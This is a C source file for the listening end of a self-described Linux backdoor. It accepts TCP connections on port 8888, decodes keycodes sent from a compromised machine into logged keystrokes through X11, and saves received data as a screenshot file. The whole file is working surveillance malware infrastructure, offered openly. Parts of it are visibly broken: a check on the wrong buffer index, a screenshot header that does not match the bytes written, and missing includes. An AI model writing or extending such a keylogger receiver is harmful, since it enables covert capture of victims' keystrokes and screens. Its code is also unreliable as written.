#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <X11/Xlib.h>
#include <X11/Xlib-xcb.h>

#define SERVER_PORT 8888
#define BUFFER_SIZE 4096

void printMessage(char *message, char* color, int omit_date)
{
    time_t current_time = time(NULL);
    struct tm *local_time = localtime(&current_time);
    char date_string[20];
    strftime(date_string, sizeof(date_string), "%Y-%m-%d %H:%M:%S", local_time);

    char default_color[] = "\033[0m";
    // if there is no color, print the message without color
    if (color == NULL) {
        if (omit_date == 1) {
            printf("%s\n", message);
        } else {
            printf("\033[0;30m[%s] %s%s\n", date_string, default_color, message);
        }
    }
    else {
        if (omit_date == 1)
            printf("%s%s%s\n", color, message, default_color);
        else
            printf("\033[0;30m[%s] %s%s%s\n", date_string, color, message, default_color);
    }
}

int main()
{
    int sockfd;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];

    printMessage("===== [LINUX BACKDOOR] =====", "\033[0;32m", 1);

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
    {
        printMessage("Failed to create socket", "\033[0;31m", 1);
        exit(EXIT_FAILURE);
    }

    // Set up server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(SERVER_PORT);

    // Bind socket to the server address
    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    {
        printMessage("Please, close the other instance of the program on the VM", "\033[0;31m", 1);
        exit(EXIT_FAILURE);
    }

    // Listen for incoming connections
    if (listen(sockfd, 1) < 0)
    {
        printMessage("You may need to run this program as root", "\033[0;31m", 1);
        exit(EXIT_FAILURE);
    }

    char listening_msg[128];
    sprintf(listening_msg, "Listening on port %d", SERVER_PORT);
    printMessage(listening_msg, "\033[0;33m", 1);

    while (1)
    {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int client_sockfd;
        int size;

        // Accept incoming connection
        client_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &client_len);
        if (client_sockfd < 0)
        {
            printMessage("Failed to accept connection", "\033[0;31m", 1);
            exit(EXIT_FAILURE);
        }

        char received_connection_msg[128];
        sprintf(received_connection_msg, "Received a connection from %s:%d", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
        printMessage(received_connection_msg, "\033[0;33m", 1);

        // Receive data
        while ((size = recv(client_sockfd, buffer, BUFFER_SIZE, 0)) > 0)
        {
            if (!size) {
                printMessage("ERROR", "\033[0;33m", 1);
                break;
            }
            // first print received message
            for (int i = 0; i < size; i++)
            {
                printf("%c", buffer[i]);
                // Process received data
                KeyCode pc = (KeyCode)buffer[i] + 8;
                Display *dpy = XOpenDisplay(NULL);

                static char received_string[BUFFER_SIZE];
                static int string_length = 0;

                KeySym keysym = XKeycodeToKeysym(dpy, pc, 0);
                char *converted = XKeysymToString(keysym);

                // Valid character
                if (converted != NULL)
                {
                    if (buffer[0] == 57)
                    {
                        strncpy(received_string + string_length, " ", BUFFER_SIZE - string_length - 1);
                        string_length++;
                        received_string[string_length] = '\0'; // Add null-terminating character
                    }
                    else if (strlen(converted) == 1)
                    {
                        // Copy the converted character(s) to the received_string buffer
                        strncpy(received_string + string_length, converted, BUFFER_SIZE - string_length - 1);
                        string_length++;
                        received_string[string_length] = '\0'; // Add null-terminating character
                    }
                    else
                    {
                        if (strlen(received_string) > 0)
                        {
                            printMessage(received_string, NULL, 0);
                            strcpy(received_string, "");
                            string_length = 0;
                        }

                        // Transform converted string to *%s* format
                        char converted_string[BUFFER_SIZE];
                        sprintf(converted_string, "*%s*", converted);
                        printMessage(converted_string, "\033[0;34m", 0);
                    }
                }

                XCloseDisplay(dpy);
            }

            // save ppm file (starts at half of the buffer)
            FILE *fp;
            fp = fopen("screenshot.ppm", "wb");
            // write bin "P6\n"
            const char *ppm_header = "P6\n1920 960\n255\n";
            fwrite(ppm_header, 1, strlen(ppm_header), fp);
            fwrite(buffer + BUFFER_SIZE / 2, 1, BUFFER_SIZE / 2, fp);

            fclose(fp);
        }

        if (size < 0)
        {
            perror("Failed to receive data");
            exit(EXIT_FAILURE);
        }

        printf("Connection closed\n");
        close(client_sockfd);
    }

    // Close the socket
    close(sockfd);

    return 0;
}
